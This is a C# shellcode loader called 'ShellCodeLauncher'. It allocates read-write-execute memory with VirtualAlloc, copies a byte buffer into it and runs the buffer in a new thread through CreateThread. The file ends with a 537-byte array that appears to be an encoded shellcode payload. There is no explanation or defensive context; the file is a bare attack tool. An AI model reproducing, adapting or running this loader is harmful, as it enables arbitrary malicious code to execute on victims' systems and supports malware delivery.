using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace ShellCodeLauncher
{
    class Program
    {
        static void Main()
        {
            //SHELLCODE_HERE

            UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length,
                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data


            IntPtr pinfo = IntPtr.Zero;

            // execute native code

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        private static UInt32 MEM_COMMIT = 0x1000;

        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);


        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId

          );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(

          IntPtr hHandle,
          UInt32 dwMilliseconds
          );
    }
}


byte[] buf = new byte[537] {
0xd9,0xc8,0xd9,0x74,0x24,0xf4,0xbf,0x31,0x01,0x36,0x5f,0x5a,0x2b,0xc9,0xb1,
0x80,0x31,0x7a,0x19,0x83,0xea,0xfc,0x03,0x7a,0x15,0xd3,0xf4,0xca,0x17,0x90,
0x13,0xc2,0x40,0x5a,0xdb,0x23,0x91,0x23,0x8d,0x62,0xc1,0xf1,0x7c,0x33,0xa9,
0xc4,0xac,0xde,0x61,0xad,0x03,0x41,0x3a,0x3a,0xf1,0x99,0xf2,0xb7,0xa4,0xb9,
0x4a,0x4c,0x3a,0xea,0x02,0x5d,0x0c,0x40,0xd9,0x2c,0x43,0x9c,0x95,0x9f,0x63,
0xb2,0x1a,0xbe,0x1f,0xc9,0x4e,0x60,0xa1,0x0c,0x47,0x6d,0x60,0x8e,0x99,0x8f,
0x8f,0xc2,0x58,0x1e,0x18,0x68,0x08,0x80,0x13,0x2c,0x91,0x88,0x22,0x61,0x8f,
0x89,0x5d,0x99,0x5b,0x8b,0x92,0x1c,0x29,0x8b,0xac,0x1e,0x45,0x0b,0x24,0x1e,
0x59,0x0b,0x7d,0x9a,0x99,0x7f,0x1a,0xec,0x18,0xaf,0xb4,0x67,0x52,0x57,0x71,
0xf3,0x23,0x47,0x30,0x02,0x74,0x64,0x94,0x4c,0x8b,0xa3,0x58,0xc6,0x47,0xbb,
0x13,0xd9,0x71,0xf6,0x92,0x10,0x35,0x39,0x15,0x0e,0x87,0xf8,0x5c,0x42,0x49,
0xfb,0x9f,0x65,0xa9,0x8e,0xee,0xda,0x2a,0x3c,0x35,0xeb,0x69,0x85,0xe4,0x9e,
0xa9,0xad,0x42,0xea,0x0a,0x69,0x02,0xed,0x5a,0x17,0xd5,0x66,0x56,0x9f,0x91,
0xf3,0x27,0x03,0x53,0x05,0x78,0x7a,0xe8,0x01,0xf0,0x34,0xef,0xd9,0x41,0x9c,
0xae,0x81,0x1f,0x45,0x6b,0x73,0xf8,0x34,0xd2,0x32,0xa2,0xfe,0x67,0x58,0x72,
0xbf,0x35,0x5e,0x93,0x67,0xfb,0xf9,0x0e,0xdf,0x70,0xeb,0x47,0x94,0x79,0xf3,
0x67,0x77,0xcf,0xb2,0xef,0xf4,0xfd,0x95,0x3c,0xc8,0x01,0x2a,0x02,0x7a,0x4b,
0xa3,0x62,0xca,0xca,0x5f,0xca,0xcb,0xcc,0x9f,0x42,0x42,0x29,0xd6,0xe8,0x56,
0xb2,0xf8,0x4d,0x96,0x1a,0xfb,0x9f,0x57,0x0f,0xb5,0xd6,0xb3,0xe3,0xcc,0x18,
0x7a,0x46,0x82,0xad,0x5a,0xb1,0xe4,0x87,0xee,0x34,0xf0,0x40,0xef,0x47,0x05,
0x91,0xb6,0x06,0xbf,0xb8,0xc8,0xe2,0xbf,0x45,0x1d,0x9e,0xb5,0xf8,0xc3,0x0f,
0x9a,0xb7,0xca,0x66,0x57,0x79,0xec,0x31,0x97,0xb9,0xa4,0x48,0xa5,0x72,0xcb,
0x8b,0x62,0x0a,0xf2,0x4d,0xc9,0xe6,0xfb,0x92,0xcd,0x08,0xd6,0x65,0x87,0x30,
0xb2,0x65,0xd6,0xe6,0x0e,0x0f,0x3a,0x5e,0x07,0xf6,0xfa,0xe5,0x8e,0xac,0x89,
0x78,0x4f,0x7b,0xf4,0xbb,0xdb,0x8e,0xbe,0xc4,0xed,0xfa,0xa5,0xd3,0x62,0x04,
0x26,0x24,0xcc,0x86,0xca,0x34,0x84,0x01,0xf0,0x78,0x25,0xdb,0x9f,0x86,0x04,
0x83,0x17,0x0e,0x7f,0x72,0x12,0x12,0xa6,0xbd,0x3d,0xec,0x8d,0xbd,0x3a,0x12,
0x53,0x97,0xf2,0x90,0x6f,0x37,0x5d,0x1e,0x99,0x52,0x21,0x61,0x3c,0xcb,0xa1,
0x71,0xbe,0x0b,0xe3,0x29,0xf6,0x82,0x11,0x81,0x37,0x5c,0x94,0xa8,0x6f,0xfa,
0x44,0x28,0x70,0xd7,0x23,0x3b,0x4d,0x91,0x3a,0xfc,0x1c,0x13,0xf4,0x4a,0x17,
0xa3,0x4e,0xc4,0xfd,0x0c,0xc6,0x2f,0x40,0x37,0xda,0x16,0x8a,0x18,0x24,0x7d,
0x89,0x5f,0xda,0x03,0xa5,0xc7,0x9a,0xac,0xec,0x9f,0x1c,0x13,0x0e,0x60,0x5c,
0xcb,0x64,0x60,0x04,0xaa,0xc2,0x6b,0x97,0x23,0x02,0x93,0x32,0x6c,0x3b,0x2a,
0x07,0xe6,0xd5,0xe1,0x16,0xf6,0xfc,0xb3,0x27,0xc6,0x17,0x7f,0x27,0x28,0x18,
0xc8,0xd6,0x14,0xae,0xe0,0x1e,0xd2,0xab,0x05,0xeb,0x57,0xf2,0x16,0xf3,0xc0,
0x9e,0xe8,0xa5,0xb9,0x99,0x2b,0xa5,0x8f,0x87,0xfa,0xb9,0x25 };
